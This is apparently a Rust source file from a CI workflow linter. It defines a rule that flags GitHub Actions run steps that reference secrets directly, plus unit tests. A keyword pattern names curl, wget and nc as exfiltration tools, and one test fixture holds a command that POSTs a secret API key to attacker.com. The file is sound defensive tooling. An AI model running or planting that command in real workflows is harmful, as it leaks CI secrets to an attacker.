//! R05 — Secret exfiltration in `run:` steps. **HIGH.**
//!
//! `${{ secrets.* }}` inside a `run:` script is a smell with two faces:
//! the secret lands in the process environment where any child process can
//! read it, and the same step often ships it somewhere (`curl`, `wget`,
//! `nc`). rivet flags both patterns conservatively — better to review a
//! safe pattern than miss a real leak. The fix is to pass secrets through
//! `env:` so they stay out of the command line.

/// Maximum script length scanned for exfiltration primitives. Workflows
/// are hand-written; anything longer is truncated for the heuristic scan
/// only (the secrets check runs on the full script).
const SCAN_CAP: usize = 8 * 1024;

use crate::expressions;
use crate::finding::{Finding, RuleId};
use crate::model::Step;
use crate::rules::RuleContext;
use crate::severity::Severity;

pub struct SecretExfiltration;

impl crate::rules::Rule for SecretExfiltration {
    fn id(&self) -> RuleId {
        RuleId::SecretExfiltration
    }

    fn evaluate<'a>(&self, ctx: &RuleContext<'a>) -> Vec<Finding> {
        let mut findings = Vec::new();
        for job in &ctx.workflow.jobs {
            for step in &job.steps {
                let Step::Run { script, .. } = step else {
                    continue;
                };
                let exprs = expressions::extract(script);
                let uses_secrets = exprs.iter().any(|e| e.text.contains("secrets."));
                if !uses_secrets {
                    continue;
                }
                let scan = &script[..script.floor_char_boundary(SCAN_CAP)];
                let exfil = exfil_primitive(scan);
                findings.push(Finding {
                    rule: RuleId::SecretExfiltration,
                    severity: Severity::High,
                    file: ctx.path.to_path_buf(),
                    line: ctx.find_line(first_nonempty_line(script)),
                    job: Some(job.id.clone()),
                    message: if exfil {
                        "run step references secrets.* and an exfiltration primitive (curl/wget/nc)"
                            .to_owned()
                    } else {
                        "run step references secrets.* directly".to_owned()
                    },
                    explanation: concat!(
                        "Secrets interpolated into a script are visible to every ",
                        "process the step spawns and can be exfiltrated by anything ",
                        "the script does. Passing them via `env:` keeps them out of ",
                        "the command line and the process table."
                    )
                    .to_owned(),
                    fix: concat!(
                        "Pass the secret through env:\n",
                        "  env:\n",
                        "    API_KEY: ${{ secrets.API_KEY }}\n",
                        "  run: curl -H \"Authorization: Bearer $API_KEY\" …"
                    )
                    .to_owned(),
                });
            }
        }
        findings
    }
}

/// True if the script invokes a common exfiltration primitive as a command
/// token (`curl`, `wget`, `nc`). Deliberately simple — this is a heuristic
/// flag, not a data-flow analysis.
fn exfil_primitive(script: &str) -> bool {
    script
        .split(|c: char| {
            c.is_whitespace() || c == '|' || c == ';' || c == '&' || c == '(' || c == ')'
        })
        .any(|tok| matches!(tok, "curl" | "wget" | "nc"))
}

/// First non-empty line of a script, used to anchor the finding's line.
fn first_nonempty_line(script: &str) -> &str {
    script.lines().find(|l| !l.trim().is_empty()).unwrap_or("")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::input::ParsedWorkflow;
    use crate::parse::parse_workflow;
    use crate::rules::Rule;
    use std::path::PathBuf;

    fn evaluate(raw: &str) -> Vec<Finding> {
        let model = parse_workflow(raw).unwrap();
        let parsed = ParsedWorkflow::new(PathBuf::from("w.yml"), raw.to_owned(), model);
        let config = crate::config::Config::default();
        SecretExfiltration.evaluate(&RuleContext {
            workflow: &parsed.model,
            path: &parsed.path,
            config: &config,
            raw: &parsed.raw,
        })
    }

    #[test]
    fn flags_secret_in_run() {
        let f = evaluate(
            "on: push\njobs:\n  b:\n    steps:\n      - run: echo ${{ secrets.API_KEY }}\n",
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn flags_curl_exfil_pattern() {
        let f = evaluate(
            "on: push\njobs:\n  b:\n    steps:\n      - run: curl -X POST https://attacker.com -d \"${{ secrets.API_KEY }}\"\n",
        );
        assert_eq!(f.len(), 1);
        assert!(f[0].message.contains("exfiltration primitive"));
    }

    #[test]
    fn passes_secret_in_env() {
        let f = evaluate(
            "on: push\njobs:\n  b:\n    env:\n      K: ${{ secrets.API_KEY }}\n    steps:\n      - run: echo \"$K\"\n",
        );
        assert!(f.is_empty());
    }
}
